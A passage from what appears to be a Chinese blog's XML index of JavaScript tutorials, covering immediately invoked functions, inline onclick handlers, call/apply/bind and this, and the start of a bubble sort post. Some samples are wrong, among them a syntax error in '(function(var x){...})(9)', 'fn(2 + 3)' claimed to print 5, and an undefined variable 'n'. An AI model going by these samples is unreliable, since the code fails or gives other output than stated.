punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token comment">// TypeError: console.logg is not a function.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此，在调试过程中可以结合上面两种情况，一步步找出错误的具体位置；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> try catch 错误 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 中语句与函数的执行辨析</title>
      <link href="/2024/09/27/javascript/javascript-zhong-yu-ju-yu-han-shu-de-zhi-xing-bian-xi/"/>
      <url>/2024/09/27/javascript/javascript-zhong-yu-ju-yu-han-shu-de-zhi-xing-bian-xi/</url>
      
        <content type="html"><![CDATA[<p>Javascript代码中，语句和函数以及匿名函数的执行存在一些区别，所以在编写过程中也存在一些“坑“。</p><h1 id="script-中的语句"><a href="#script-中的语句" class="headerlink" title="script 中的语句"></a>script 中的语句</h1><p>html文档中的javascript语句是写在 <code>&lt;script&gt;&lt;/script&gt;</code> 中的，每条语句末尾需要添加分号 <code>;</code>，表示此条语句执行结束。例如下面的代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>文档加载到这块代码区域时，就会立刻<strong>执行</strong>这两条语句，即弹出提示框为x的值，但是如果把语句换成函数定义，代码如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">fx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时第一行语句会被<strong>执行</strong>，第二至五行是<strong>函数定义</strong>，并不会执行这个函数，直到最后一行语句才会真正<strong>执行</strong>这个定义过的函数。</p><p>如果需要立刻执行函数的话，就需要使用<strong>匿名函数</strong>了。所谓匿名函数，顾名思义，即不会给这个执行的函数定义“函数名”，而且是一个立即执行的语句。格式如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意</strong>代码中的三个<strong>括号</strong>的位置，以及最后跟的那个<strong>分号</strong>，表示这是一个立即执行的语句。</p><p>当然匿名函数也能<strong>传递参数</strong>，例如：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">var</span> x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果和上面一样。</p><p>但有时又需要不立即执行的函数，例如：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果与下面代码一样：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">"alert(x)"</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这是Javascript中的延时函数，表示2秒后弹出提示。<code>setTimeout()</code> 自身就是一个<strong>函数</strong>，里面的 <code>“alert(x)”</code> 是这个函数的一个<strong>参数</strong>，即一个<strong>加引号的语句</strong>。便于理解，可以写成这样：</p><pre><code>setTimeout(&quot;alert();&quot;, 2000);</code></pre><p>这样写并不会出错。</p><p>所以这个函数 <code>setTimeout()</code> 的参数是一个<strong>不用立即执行</strong>的匿名函数 <code>function()&#123;&#125;</code>，也可以是一个语句块，从而进行<strong>参数传递</strong>。</p><p>通俗讲，这里加引号的语句块相当于不加引号的匿名函数。</p><h1 id="标签属性中的语句"><a href="#标签属性中的语句" class="headerlink" title="标签属性中的语句"></a>标签属性中的语句</h1><p>在 html 标签中也能使用语句，通常用于设置元素的属性。</p><p>先对比区分以下代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">function</span> <span class="token function">fx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Button1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">fx</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Button2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">fx</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>Button3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>Button4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Button5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span></span><span class="token punctuation">></span></span>Button6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Button7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜一下哪个按钮点击无效……</p><p>答案是最后的<strong>“Button6”</strong>和**”Button7”<strong>，然后就能发现规律了，</strong>属性<strong>所设置的</strong>值<strong>必须是能</strong>立即执行**的<u>语句块</u>、<u>函数</u>或<u>匿名函数</u>，最后那两种情况是行不通的。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript函数 匿名函数 javascript语句 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 之 call，bind，apply 方法及 this 的用法辨析</title>
      <link href="/2024/09/27/javascript/javascript-zhi-call-bind-apply-fang-fa-ji-this-de-yong-fa-bian-xi/"/>
      <url>/2024/09/27/javascript/javascript-zhi-call-bind-apply-fang-fa-ji-this-de-yong-fa-bian-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>JavaScript函数中的三个方法<code>.call()</code>, <code>.apply()</code>, <code>.bind()</code>，总体来说主要功能就是改变函数中 <code>this</code> 关键字的指向，因为 <code>this</code> 默认指向<strong>当前环境的对象</strong>；</p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Knight'</span><span class="token punctuation">,</span>    <span class="token function-variable function">getName</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// this 指向 obj 对象</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>obj<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 'Knight'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="call"><a href="#call" class="headerlink" title="call()"></a>call()</h1><p><code>.call()</code> 可以用于改变 <code>this</code> 值的指向，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Knight'</span><span class="token punctuation">;</span> <span class="token comment">// 此处 this 指向全局对象 window;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Cloud'</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 'Knight'</span><span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 'Cloud'</span><span class="token comment">// 此处指向了 obj 对象，所以 name 变了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以传递函数参数，平常调用函数的形式可能是这样：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在也可以这样调用：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">+</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 5</span><span class="token comment">// 因为函数里没有用到 this，</span><span class="token comment">// 所以可以设置为 null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="apply"><a href="#apply" class="headerlink" title="apply()"></a>apply()</h1><p><code>.apply()</code> 与 <code>.call()</code> 类似，第一个参数也是用于改变 <code>this</code> 指向，区别就是 <code>apply()</code> 接受的函数参数是一个<strong>数组</strong>，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Mu name is '</span> <span class="token operator">+</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">+</span>    <span class="token string">' years old.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Knight'</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// My name is Knight, 5 years old.</span><span class="token comment">// 使用 call() 的情况：</span><span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// My name is Knight, 5 years old.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="bind"><a href="#bind" class="headerlink" title="bind()"></a>bind()</h1><p><code>.bind()</code> 也与 <code>.call()</code> 类似，改变 this 指向，传递函数参数，区别在于 <code>.bind()</code> 方法结果是创建一个新的 <strong>绑定函数</strong>，而之前的 <code>.call()</code> 和 <code>.apply()</code> 结果都是 <strong>立即执行函数</strong>，举例来理解：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Knight'</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'My name is '</span> <span class="token operator">+</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">+</span>    <span class="token string">' years old.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> fnn <span class="token operator">=</span> <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// fn.bind() 是一个函数，不会立即执行</span><span class="token function">fnn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// My name is Knight, 5 years old.</span><span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 这种写法就是立即执行函数了，</span><span class="token comment">// 结果与上面一样;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="this-的困境"><a href="#this-的困境" class="headerlink" title="this 的困境"></a>this 的困境</h1><p>考虑以下情况：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fn2: '</span> <span class="token operator">+</span>        <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fn1: '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn1</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">'here'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 'fn1: here'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果不会输出 <code>fn2: here</code>，因为函数定义 <code>fn2</code> 里的 <code>this</code> 是一个新的指向，并且未定义，与外部函数 <code>fn1</code> 中的 <code>this</code> 不同；</p><p>所以我们通常会进行一下处理：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fn2: '</span> <span class="token operator">+</span>        <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// 对 this 进行转存</span>    <span class="token keyword">var</span> that <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token function">fn2</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>that<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fn1: '</span> <span class="token operator">+</span>    <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn1</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">'here'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*fn2: herefn1: here*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然，ES6中的<strong>箭头函数</strong>解决了上述问题：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token function-variable function">fn2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fn2: '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fn2</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">'there'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fn1: '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn1</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">'here'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*fn2: herefn2: herefn1: here*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 <code>.call()</code> 方法对箭头函数不起作用，所以上面的第二行输出与第一行相同；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bind call apply this </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 之常见算法排序</title>
      <link href="/2024/09/27/javascript/javascript-zhi-chang-jian-suan-fa-pai-xu/"/>
      <url>/2024/09/27/javascript/javascript-zhi-chang-jian-suan-fa-pai-xu/</url>
      
        <content type="html"><![CDATA[<h1 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h1><p>冒泡排序即数组从头到尾，依次比较相邻两数的大小，不符合顺序则交换位置，一直循环直到排序完成。如果是升序排序，那么每一轮的一系列比较和交换之后，最大那个数一定会被排到最后（不信可以动手验证一下），可以理解为<strong>冒泡</strong>到最后，这样每一轮的最大那个数都冒到最后，所以每一轮需要比较的总数都在减少，直到剩一个数为止，序列就有序了，降序也是同样的道理；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 输入值 _arr 为需要排序的数组，返回一个有序新数组</span><span class="token keyword">function</span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span><span class="token parameter">_arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> arr <span class="token operator">=</span> _arr<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token 